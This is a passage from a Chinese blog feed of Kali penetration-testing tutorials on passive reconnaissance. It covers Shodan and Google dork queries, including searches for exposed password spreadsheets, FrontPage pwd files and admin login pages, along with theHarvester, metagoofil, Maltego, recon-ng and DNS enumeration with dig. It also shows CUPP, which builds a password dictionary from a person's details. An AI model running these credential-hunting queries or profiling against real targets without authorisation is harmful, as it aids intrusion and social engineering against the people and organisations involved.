src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207103644663.png" alt="image-20221207103644663"></li><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207104348566.png" alt="image-20221207104348566"></li></ul></li><li>city<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207104528534.png" alt="image-20221207104528534"></li></ul></li><li>county（CN、US）<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207104439811.png" alt="image-20221207104439811"></li></ul></li><li>port（80、21、22、23）<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207104737232.png" alt="image-20221207104737232"></li></ul></li><li>os<ul><li>os:”windows 2000”</li><li>os:Linux</li></ul></li><li>Hostname（主机或域名）<ul><li>hostname:baidu.com</li></ul></li><li>server<ul><li>server: Apache&#x2F;2.2.23</li></ul></li><li>linux upnp avtech</li></ul></li></ul><blockquote><p>可以根据自己的搜索的习惯定义自己的搜索字段</p></blockquote><h2 id="GOOGLE搜索"><a href="#GOOGLE搜索" class="headerlink" title="GOOGLE搜索"></a>GOOGLE搜索</h2><ul><li>+支付 -充值<ul><li><code>+</code>表示需要<code>支付</code>关键字，<code>-</code>表示不包含<code>充值</code>关键字</li><li>“支付 充值”：表示双引号内的关键字一起搜索出来</li></ul></li><li>北京 intitle:电子商务 intext:法人 intext:电话<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207172818255.png" alt="image-20221207172818255"></li></ul></li><li>北京 site:alibaba.com inurl:contact<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207173209827.png" alt="image-20221207173209827"></li></ul></li><li>SOX filetype:pdf（doc、png、ppt）<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207173721111.png" alt="image-20221207173721111"></li></ul></li><li>payment site:fr（搜索法国[fr]的支付相关页面）<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207174238286.png" alt="image-20221207174238286"></li></ul></li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>inurl:”level&#x2F;15&#x2F;exec&#x2F;-&#x2F;show” （等级为15级的交换机配置页面）</p><ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207174527916.png" alt="image-20221207174527916"></li><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207174634764.png" alt="image-20221207174634764"></li></ul><p>intitle:”netbotz appliance” “ok”（某一个特定类型的机架式的网络摄像头的指令）</p><p>inurl :&#x2F;admin&#x2F;login.php（搜索管理后台）</p><ul><li><p><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207181401334.png" alt="image-20221207181401334"></p></li><li><p>filetype:xls “usename | password”</p><ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207183346992.png" alt="image-20221207183346992"></li></ul></li><li><p>inurl:Service:pwd（搜索FrontPage的pwd文件[帐号密码]）</p><ul><li><p><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207184351823.png" alt="image-20221207184351823"></p></li><li><p><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221207184327772.png" alt="image-20221207184327772"></p></li></ul></li><li><p><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><ul><li>谷歌语法大全（安全人员必备）</li><li>熟悉其中语句</li></ul></li></ul><h2 id="YANDEX"><a href="#YANDEX" class="headerlink" title="YANDEX"></a>YANDEX</h2><blockquote><p>世界第四大搜索引擎—俄罗斯</p><p><a href="https://www.yandex.com/">https://www.yandex.com/</a></p></blockquote><ul><li>YANDEX 搜索语法参照 GOOGLE 搜索语法</li></ul><h2 id="调用搜索引擎并发式搜索"><a href="#调用搜索引擎并发式搜索" class="headerlink" title="调用搜索引擎并发式搜索"></a>调用搜索引擎并发式搜索</h2><h3 id="theHarvester"><a href="#theHarvester" class="headerlink" title="theHarvester"></a>theHarvester</h3><blockquote><p>-d，–domain       要搜索的公司名称或域名。</p><p>-l,  –limit         限制搜索结果的数量，默认&#x3D;500。</p><p>-S, –start         从结果编号 X 开始，默认 &#x3D; 0。</p><p>-g, –google-dork   使用 Google Dorks 进行 Google 搜索。</p><p>-p, –proxies       对请求使用代理，在 proxies.yaml 中输入代理。</p><p>-s, –shodan       使用 Shodan 查询发现的主机。</p><p>–screenshot       对已解析的域进行截图，指定输出目录：–screenshot output_directory</p><p>-v, –virtual-host   通过 DNS 解析验证主机名并搜索虚拟主机。</p><p>-e, –dns-server    用于查找的 DNS 服务器。</p><p>-f，–filename     将结果保存到 XML 和 JSON 文件。</p><p>-b, –source       指定搜索的引擎和数据源</p></blockquote><p><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208102103318.png" alt="image-20221208102103318"></p><ul><li><p><code>theHarvester -d 163.com -l 200 -b bing</code></p><ul><li><p>-d 搜索域名163.com，-l 限制数量200条，-b 指定浏览器为bing</p><ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208102611768-1670467647849-1.png" alt="image-20221208102611768"></li></ul></li><li><p>通过代理链进行搜索</p><ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208104938125.png" alt="image-20221208104938125"></li></ul></li></ul></li></ul><h3 id="metagoofil"><a href="#metagoofil" class="headerlink" title="metagoofil"></a>metagoofil</h3><blockquote><p>-d 指定域名</p><p>-e 间隔搜索时间，默认30s，时间太短google会封IP</p><p>-f 保存为html文件</p><p>-i 获取不到的网页在超时之前等待，默认15s</p><p>-l 最大搜索结果，默认100</p><p>-n 限制文件数量下载，默认100</p><p>-o 保存结果的目录</p><p>-r 下载线程数，默认8</p><p>-t 搜索的文件类型（pdf，doc，xls，ppt等）、</p><p>-u 指定UA头</p></blockquote><p><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208110157986-1670468518861-3.png" alt="image-20221208110157986"></p><ul><li>proxychains metagoofil -d sina.com -t pdf -l 200 -o test -f<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208111132499.png" alt="image-20221208111132499"></li><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208111152117.png" alt="image-20221208111152117"></li><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208111409097.png" alt="image-20221208111409097"></li><li>已经将pdf文件下载到test文件夹</li></ul></li></ul><h3 id="MALTEGO"><a href="#MALTEGO" class="headerlink" title="MALTEGO"></a>MALTEGO</h3><ul><li><p>新建视图通过域名搜索</p><ul><li><p>注册的整个过程都需要科学上网</p></li><li><p>Transforms为Domains[DNS]</p><ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208164143645.png" alt="image-20221208164143645"></li></ul></li><li><p>Transforms为MX记录</p><ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208164613049.png" alt="image-20221208164613049"></li></ul></li><li><p>Transforms为NS记录</p><ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208164643559.png" alt="image-20221208164643559"></li></ul></li><li><p>Transforms为Web站点</p><ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208165051001.png" alt="image-20221208165051001"></li></ul></li><li><p>Transforms为whois查询</p><ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208165307687.png" alt="image-20221208165307687"></li></ul></li><li><p>Output输出为done时表示搜索完成</p><ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208165454532.png" alt="image-20221208165454532"></li></ul></li><li><p><strong>MALTEGO根据碎片化的信息片段，可以把整个的系统重新构建出来，例如，指定一个文档，一个人，一个电话，一个社交媒体的账号，就可以绘制出整个系统架构。一站式的信息搜集工具，极其强大。</strong></p></li></ul></li></ul><h2 id="其他途径"><a href="#其他途径" class="headerlink" title="其他途径"></a>其他途径</h2><ul><li>社交网络<ul><li>社工</li></ul></li><li>工商注册</li><li>新闻组&#x2F;论坛</li><li>招聘网站<ul><li>如果招聘安全人员，查看招聘什么安全人员，例如招聘web安全人员，着重关注web站点</li></ul></li><li><a href="http://www.archive.org/web/web.php">http://www.archive.org/web/web.php</a><ul><li>搜集各大网站的某一时间点的版本，进行跟踪，可以查看历史信息查看当前可能被遗漏的信息，进行后续渗透</li></ul></li></ul><h2 id="个人专属的密码字典"><a href="#个人专属的密码字典" class="headerlink" title="个人专属的密码字典"></a>个人专属的密码字典</h2><h3 id="CUPP"><a href="#CUPP" class="headerlink" title="CUPP"></a>CUPP</h3><ul><li>按个人信息生成其专属的密码字典</li><li>CUPP—Common User Password Profiler<ul><li>git clone <a href="https://github.com/Mebus/cupp.git">https://github.com/Mebus/cupp.git</a></li><li>cupp -i<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208174843814.png" alt="image-20221208174843814"></li><li>通过填写相关信息去生成对应的专属密码</li><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208174940697.png" alt="image-20221208174940697"></li></ul></li></ul></li></ul><h3 id="METADATA（元数据）"><a href="#METADATA（元数据）" class="headerlink" title="METADATA（元数据）"></a>METADATA（元数据）</h3><ul><li>Exif图片信息<ul><li>图片会记录GPS信息，相机或者手机会记录当前相片地点的GPS位置（前提是需要开启这个功能，一般默认打开），每个照片还会记录当前生成时的信息，例如光圈信息，快门曝光时间是多少等等，这些都是Exif信息。安全人员比较关心的还是设备信息，GPS定位信息。</li><li>使用Kali提供的exif来提取图片信息，设备以及GPS定位信息<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208184130321.png" alt="image-20221208184130321"></li><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221208184158561.png" alt="image-20221208184158561"></li></ul></li></ul></li><li>Foca<ul><li>windows工具提取图片的METADATA信息</li></ul></li></ul><h2 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h2><blockquote><p>全特性的基于web的侦察框架</p><p>基于python开发</p><p>命令格式与msf一致</p><p>调用搜索引擎</p><p>使用方法：</p><p>​模块：调用不同的搜索引擎进行搜索</p><p>​数据库：搜索结果自动存储数据库</p><p>​报告：利用recon-ng搜索结果直接导出报告</p></blockquote><ul><li>参数说明：</li></ul><p><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221209103331096.png" alt="image-20221209103331096"></p><blockquote><p>-w 加载或者创建新的工作区</p><p>-r   从资源文件加载命令</p><p>–stealth 禁用所有被动请求</p><p>–accessible 可用时使用可访问的输出</p></blockquote><ul><li>创建新浪的工作区<ul><li>recon-ng -w sina<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221209103935962.png" alt="image-20221209103935962"></li></ul></li><li>key参数添加api<ul><li><img src="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/image-20221209110720459.png" alt="image-20221209110720459"></li></ul></li><li>新版本的recon-ng需要自行添加模块<ul><li>marketplace refresh  # 刷新安装的模块</li><li>marketplace install all  # 安装所有模块</li><li>需要科学上网</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试--被动信息搜集</title>
      <link href="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/"/>
      <url>/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="公开渠道搜集"><a href="#公开渠道搜集" class="headerlink" title="公开渠道搜集"></a>公开渠道搜集</h2><p>被动信息搜集完全基于公开渠道的信息获取，这些信息都是在公开渠道被公开过；被动信息搜集就是通过公开渠道去搜集目标公司以及系统相关的信息，不会与目标系统产生直接交互访问，搜索渠道和手段都是基于搜索引擎，媒体网站等。</p><p>官方信息搜集文章：</p><p>美国军方：</p><p><a href="http://www.fas.org/irp/doddir/army/atp2-22-9.pdf">http://www.fas.org/irp/doddir/army/atp2-22-9.pdf</a></p><p>北大西洋公约组织：<br><a href="http://informaition-retrieval.info/docs/BATO-OSINT.html">http://informaition-retrieval.info/docs/BATO-OSINT.html</a></p><h2 id="信息搜集内容"><a href="#信息搜集内容" class="headerlink" title="信息搜集内容"></a>信息搜集内容</h2><ul><li><p>IP地址段</p></li><li><p>域名信息</p></li><li><p>邮件地址</p><ul><li>社工进行攻击探测</li></ul></li><li><p>文档图片数据</p><ul><li>获取企业内部的数据</li><li>社工</li></ul></li><li><p>公司地址</p><ul><li>对应无线网络</li><li>社工</li></ul></li><li><p>公司组织架构</p><ul><li>不同部门展开不同的社工方式</li></ul></li><li><p>联系电话&#x2F;传真号码</p></li><li><p>人员姓名&#x2F;职务</p></li><li><p>目标系统使用的技术架构</p><ul><li>通过搜索引擎探测（发现一部分）</li></ul></li><li><p>公开的商业信息</p></li></ul><h2 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h2><ul><li>用信息描述目标<ul><li>通过这些信息重构这家公司，怎么样运作</li></ul></li><li>发现<ul><li>发现具体主机系统，服务</li></ul></li><li>社会工程学攻击</li><li>物理缺口<ul><li>物理表攻击</li></ul></li></ul><h2 id="信息搜集—DNS"><a href="#信息搜集—DNS" class="headerlink" title="信息搜集—DNS"></a>信息搜集—DNS</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>通常来做渗透测试项目时，从客户源只会得到一个DNS域名，后续所有的信息都需要自己进一步信息搜集。</p><ul><li><p>域名解析成IP地址</p><ul><li><p>域名与FQDN的区别</p><pre class="line-numbers language-none"><code class="language-none">域名：sina,comFQDN(完全限定域名)：www.sina.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>域名记录：A、C name、NS、MX、PTR</p></li><li><p>A：主机记录；C name：别名记录；NS：域名服务器地址记录；MX：邮件交换记录；PTR：IP地址解析域名</p><ul><li>下图为DNS左边为递归查询流程，右边为迭代查询流程</li></ul></li></ul></li></ul><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233437712.png" alt="image-20221217233437712"></p><h3 id="DNS信息搜集—NSLOOKUP"><a href="#DNS信息搜集—NSLOOKUP" class="headerlink" title="DNS信息搜集—NSLOOKUP"></a>DNS信息搜集—NSLOOKUP</h3><p>type类型参数：a，ns，server，mx，ptr，any，spf</p><p>以<a href="http://www.sina.com为例：">www.sina.com为例：</a></p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233523044.png" alt="image-20221217233523044"></p><p>mx查询邮件服务器记录：</p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233537104.png" alt="image-20221217233537104"></p><p>ns域名服务器地址：</p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233549531.png" alt="image-20221217233549531"></p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233613660.png" alt="image-20221217233613660"></p><p>any记录，全部查询出来：</p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233628653.png" alt="image-20221217233628653"></p><p>（<strong>spf记录将ip地址反向解析为域名，用来反垃圾邮件设置</strong>）</p><h3 id="DNS信息搜集—DIG"><a href="#DNS信息搜集—DIG" class="headerlink" title="DNS信息搜集—DIG"></a>DNS信息搜集—DIG</h3><blockquote><p>多指定几个域名服务器进行查询</p></blockquote><ul><li><p>指定域名服务器查询：</p><ul><li>dig sina.com any @8.8.8.8</li></ul><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233745182.png" alt="image-20221217233745182"></p><ul><li><p>dig +noall mail.163.com any</p><blockquote><p>参数noall表示什么结果都不输出</p></blockquote></li></ul><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233757164.png" alt="image-20221217233757164"></p><ul><li><p>dig +noall +answer mail.163.com any</p><blockquote><p>不输出回答信息</p></blockquote></li></ul><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233807857.png" alt="image-20221217233807857"></p><ul><li><p>dig +noall +answer -x 8.8.8.8</p><blockquote><p>-x 参数 反向查询PTR</p></blockquote></li></ul><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233819899.png" alt="image-20221217233819899"></p></li><li><p>利用dig查询DNS服务器BIND信息</p><ul><li><p>dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</p><blockquote><p>查询ns3.dnsv4.com服务器BIND版本信息，BIND记录类型是txt，类级别是chaos类</p></blockquote></li></ul></li></ul><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233907385.png" alt="image-20221217233907385"></p><p>查询到的版本信息如图。</p><blockquote><p>可以到BIND官网查询是否是最新的版本，若不是最新版本，查看release描述文件查看最新版本的修复了那些漏洞，进行漏洞利用。</p></blockquote><ul><li><p>有些DNS的BIND记录查询不到</p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233918331.png" alt="image-20221217233918331"></p></li><li><p>dig追踪查询</p><ul><li><code>dig +trace www.sina.com</code></li></ul><p>查询结果如图，进行的是迭代查询，先去访问了根域，拿到.com域名服务器地址：</p><p><img src="/2022/12/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90DNS%E7%AF%87%E3%80%91/image-20221217233932217.png" alt="image-20221217233932217"></p><p>之后，再从.com域名服务器中随机挑选一个IP地址192.5.5.241在查询sina.com域的NS记录，之后再从sina.com域名服务器NS记录中随机挑选了一个IP地址192.31.80.30查询<a href="http://www.sina.com,最后解析为c/">www.sina.com，最后解析为C</a> name记录。最终是进行的迭代查询。</p><p><img 